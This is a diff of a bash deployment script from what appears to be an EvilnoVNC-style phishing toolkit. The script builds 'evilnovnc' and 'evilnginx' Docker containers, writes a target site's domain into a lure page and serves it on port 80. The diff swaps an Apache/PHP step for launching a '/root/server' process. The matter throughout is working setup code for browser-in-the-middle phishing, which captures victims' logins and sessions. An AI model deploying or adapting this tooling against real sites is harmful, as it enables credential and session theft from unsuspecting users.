@@ -35,7 +35,6 @@ WEBPAGE=$1
 path=$(pwd)
 printf "\n\e[1;33m[>]Preparando nginx...\n"
 cd Files
-cp index.php index_tmp.php
 cp index.html index_tmp.html
 id_image=$(sudo docker images evilnovnc -q)
 if [ -z $id_image ]; then
@@ -43,22 +42,18 @@ if [ -z $id_image ]; then
     exit 1
 fi
 
-sed -i'' -e "s,webpage,$WEBPAGE,g" index_tmp.php
-sed -i'' -e "s,idimage,$id_image,g" index_tmp.php
-sed -i'' -e "s,download_string,$path/Downloads,g" index_tmp.php
 #Change this if you have another index.html
 domain=$(echo "$WEBPAGE" | awk -F/ '{print $3}')
 sed -i'' -e "s,_domain_,$domain,g" index_tmp.html
 cd ..
 sudo docker network create nginx-evil 2> /dev/null
-sudo docker run --name evilnginx --rm  -v /var/run/docker.sock:/var/run/docker.sock -v $(pwd)/Files:/data --network nginx-evil -p 80:8080 -d evilnginx
+sudo docker run --name evilnginx --rm  -v /var/run/docker.sock:/var/run/docker.sock -v $(pwd)/Files:/data --network nginx-evil -p 80:80 -d evilnginx
 sudo docker exec -it evilnginx bash -c "cp /data/default.conf /etc/nginx/conf.d/default.conf"
 sudo docker exec -it evilnginx bash -c "chmod 777 /etc/nginx/conf.d/default.conf"
 sudo docker exec -it evilnginx bash -c "nginx -s reload"
+
 sudo docker exec -it evilnginx bash -c "cp /data/index_tmp.html /usr/share/nginx/html/index.html"
-sudo docker exec -it evilnginx bash -c "cp /data/index_tmp.php /var/www/html/index.php"
-sudo docker exec -it evilnginx bash -c "service apache2 start"
-rm ./Files/index_tmp.php
+sudo docker exec -it evilnginx bash -c "nohup /bin/bash -c '/root/server $path $WEBPAGE &'"
 rm ./Files/index_tmp.html
 printf "\n\e[1;33m[>]Fin nginx..."
 
